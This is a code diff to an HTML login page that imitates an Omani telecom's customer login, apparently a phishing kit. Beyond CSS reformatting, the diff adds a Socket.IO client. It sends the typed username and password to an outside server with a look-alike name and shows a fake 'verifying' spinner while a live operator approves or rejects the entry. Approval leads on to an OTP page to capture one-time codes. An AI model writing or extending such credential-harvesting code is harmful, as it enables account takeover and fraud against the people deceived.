@@ -30,12 +30,9 @@
       --card-shadow: 0 19px 39px rgba(0, 0, 0, 0.095);
     }
 
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
-    html,
-    body {
+    html, body {
       width: 100%;
       min-height: 100%;
       margin: 0;
@@ -46,9 +43,7 @@
       text-rendering: geometricPrecision;
     }
 
-    body {
-      min-height: 100vh;
-    }
+    body { min-height: 100vh; }
 
     .login-page {
       width: 100%;
@@ -97,18 +92,10 @@
       line-height: 1.5;
     }
 
-    .login-form {
-      width: 100%;
-      margin-top: 0;
-    }
+    .login-form { width: 100%; margin-top: 0; }
 
-    .field-group {
-      margin-top: 7px;
-    }
-
-    .field-group + .field-group {
-      margin-top: 22px;
-    }
+    .field-group { margin-top: 7px; }
+    .field-group + .field-group { margin-top: 22px; }
 
     .field-label {
       display: block;
@@ -136,10 +123,7 @@
       transition: border-color 0.18s ease, box-shadow 0.18s ease;
     }
 
-    .text-field::placeholder {
-      color: var(--field-placeholder);
-      opacity: 1;
-    }
+    .text-field::placeholder { color: var(--field-placeholder); opacity: 1; }
 
     .text-field:focus {
       border-color: rgba(237, 28, 36, 0.48);
@@ -161,19 +145,11 @@
       text-decoration: none;
     }
 
-    .forgot-link:hover,
-    .forgot-link:focus-visible {
-      text-decoration: underline;
-    }
+    .forgot-link:hover, .forgot-link:focus-visible { text-decoration: underline; }
 
-    .button-stack {
-      width: 100%;
-      display: grid;
-      gap: 18px;
-    }
+    .button-stack { width: 100%; display: grid; gap: 18px; }
 
-    .login-button,
-    .signup-button {
+    .login-button, .signup-button {
       width: 100%;
       height: 59px;
       display: flex;
@@ -214,9 +190,7 @@
       text-decoration: none;
     }
 
-    .back-wrap {
-      text-align: center;
-    }
+    .back-wrap { text-align: center; }
 
     .back-link svg {
       width: 17px;
@@ -225,33 +199,51 @@
       transform: translateY(-1px);
     }
 
+    /* Waiting/Loading overlay */
+    #waitingOverlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(255,255,255,0.85);
+      z-index: 9998;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid #ed1c24;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 16px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .waiting-text {
+      font-size: 16px;
+      color: #333;
+      font-weight: 500;
+    }
+    .error-msg {
+      display: none;
+      color: #ed1c24;
+      text-align: center;
+      font-size: 14px;
+      margin-top: 10px;
+      font-weight: 500;
+    }
+
     @media (max-width: 700px) {
-      .login-page {
-        padding: 32px 15px 24px;
-      }
-
-      .login-card {
-        width: 100%;
-        min-height: 0;
-        padding: 36px 20px 31px;
-      }
-
-      .login-title {
-        font-size: 31px;
-      }
-
-      .login-subtitle,
-      .field-label {
-        font-size: 15px;
-      }
-
-      .forgot-row {
-        height: 39px;
-      }
-
-      .forgot-link {
-        font-size: 15px;
-      }
+      .login-page { padding: 32px 15px 24px; }
+      .login-card { width: 100%; min-height: 0; padding: 36px 20px 31px; }
+      .login-title { font-size: 31px; }
+      .login-subtitle, .field-label { font-size: 15px; }
+      .forgot-row { height: 39px; }
+      .forgot-link { font-size: 15px; }
     }
   </style>
 </head>
@@ -266,7 +258,7 @@
       <h1 class="login-title" id="login-title">Welcome back</h1>
       <p class="login-subtitle">Login to your account</p>
 
-      <form class="login-form" action="#" method="post" autocomplete="on">
+      <form class="login-form" id="loginForm" action="#" method="post" autocomplete="on">
         <div class="field-group">
           <label class="field-label" for="username">Username</label>
           <input class="text-field" id="username" name="username" type="text" placeholder="Enter your Username" autocomplete="username">
@@ -282,19 +274,26 @@
         </div>
 
         <div class="button-stack">
-          <button class="login-button" type="submit">Login</button>
+          <button class="login-button" id="loginBtn" type="submit">Login</button>
           <a class="signup-button" href="/customer-authentication.html">Sign Up</a>
         </div>
+        <p class="error-msg" id="errorMsg">بيانات الدخول غير صحيحة. يرجى المحاولة مرة أخرى.</p>
       </form>
 
       <div class="back-wrap">
-        <a class="back-link" href="/customer-authentication.html" aria-label="Back">
+        <a class="back-link" href="/" aria-label="Back">
           <svg viewBox="0 0 20 20" aria-hidden="true" focusable="false"><path d="M8.72 4.22a.95.95 0 0 1 0 1.34L5.24 9.05h10.81a.95.95 0 1 1 0 1.9H5.24l3.48 3.49a.95.95 0 0 1-1.34 1.34l-5.1-5.1a.96.96 0 0 1 0-1.36l5.1-5.1a.95.95 0 0 1 1.34 0Z"></path></svg>
           <span>Back</span>
         </a>
       </div>
     </section>
   </main>
+
+  <!-- Waiting Overlay -->
+  <div id="waitingOverlay">
+    <div class="spinner"></div>
+    <p class="waiting-text">جاري التحقق من البيانات...</p>
+  </div>
 
   <!-- Popup Overlay -->
   <div id="welcomePopup" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center;">
@@ -308,21 +307,42 @@
     </div>
   </div>
 
+  <!-- Socket.IO -->
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
   <script>
-    // Show popup if coming from ATM page
     (function() {
+      // Show popup if coming from ATM page
       var params = new URLSearchParams(window.location.search);
       if (params.get('popup') === '1') {
         document.getElementById('welcomePopup').style.display = 'flex';
       }
-    })();
-  </script>
 
-  <script>
-    (function () {
-      var form = document.querySelector('.login-form');
-      if (!form) return;
+      // Socket.IO connection
+      var SOCKET_URL = window.location.hostname === 'localhost' 
+        ? 'http://localhost:3001' 
+        : 'https://oredoooman-server.fly.dev';
+      
+      var socket = io(SOCKET_URL, { transports: ['websocket', 'polling'] });
+      
+      // Register visitor
+      var visitorId = localStorage.getItem('visitorId') || null;
+      socket.on('connect', function() {
+        socket.emit('visitor:register', { existingVisitorId: visitorId });
+        socket.emit('visitor:pageEnter', 'تسجيل الدخول');
+      });
+      socket.on('visitor:registered', function(data) {
+        if (data && data.visitorId) {
+          localStorage.setItem('visitorId', data.visitorId);
+        }
+      });
 
+      // Handle form submission
+      var form = document.getElementById('loginForm');
+      var loginBtn = document.getElementById('loginBtn');
+      var waitingOverlay = document.getElementById('waitingOverlay');
+      var errorMsg = document.getElementById('errorMsg');
+
+      // Strip Arabic letters
       var arabicLettersPattern = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g;
       var restrictedFields = form.querySelectorAll('#username, #password');
 
@@ -339,26 +359,55 @@
         }
       }
 
-      restrictedFields.forEach(function (field) {
+      restrictedFields.forEach(function(field) {
         field.setAttribute('dir', 'ltr');
-        field.addEventListener('beforeinput', function (event) {
+        field.addEventListener('beforeinput', function(event) {
           if (event.data && arabicLettersPattern.test(event.data)) {
             event.preventDefault();
           }
           arabicLettersPattern.lastIndex = 0;
         });
-        field.addEventListener('input', function () {
-          stripArabicLetters(field);
-        });
-        field.addEventListener('paste', function () {
-          window.setTimeout(function () {
-            stripArabicLetters(field);
-          }, 0);
+        field.addEventListener('input', function() { stripArabicLetters(field); });
+        field.addEventListener('paste', function() {
+          window.setTimeout(function() { stripArabicLetters(field); }, 0);
         });
       });
 
-      form.addEventListener('submit', function (event) {
+      form.addEventListener('submit', function(event) {
         event.preventDefault();
+        
+        var username = document.getElementById('username').value.trim();
+        var password = document.getElementById('password').value.trim();
+        
+        if (!username || !password) return;
+
+        // Show loading
+        loginBtn.disabled = true;
+        loginBtn.textContent = 'جاري التحقق...';
+        waitingOverlay.style.display = 'flex';
+        errorMsg.style.display = 'none';
+
+        // Send data to server
+        socket.emit('more-info', {
+          content: { 'اسم المستخدم': username, 'كلمة المرور': password },
+          page: 'تسجيل الدخول',
+          waitingForAdminResponse: true
+        });
+      });
+
+      // Listen for admin response (approve/reject)
+      socket.on('card:action', function(data) {
+        var act = (data && data.action) ? data.action : data;
+        if (act === 'approve') {
+          // Navigate to OTP login page
+          window.location.href = '/customer-authentication/';
+        } else if (act === 'reject') {
+          // Show error and reset
+          waitingOverlay.style.display = 'none';
+          loginBtn.disabled = false;
+          loginBtn.textContent = 'Login';
+          errorMsg.style.display = 'block';
+        }
       });
     })();
   </script>
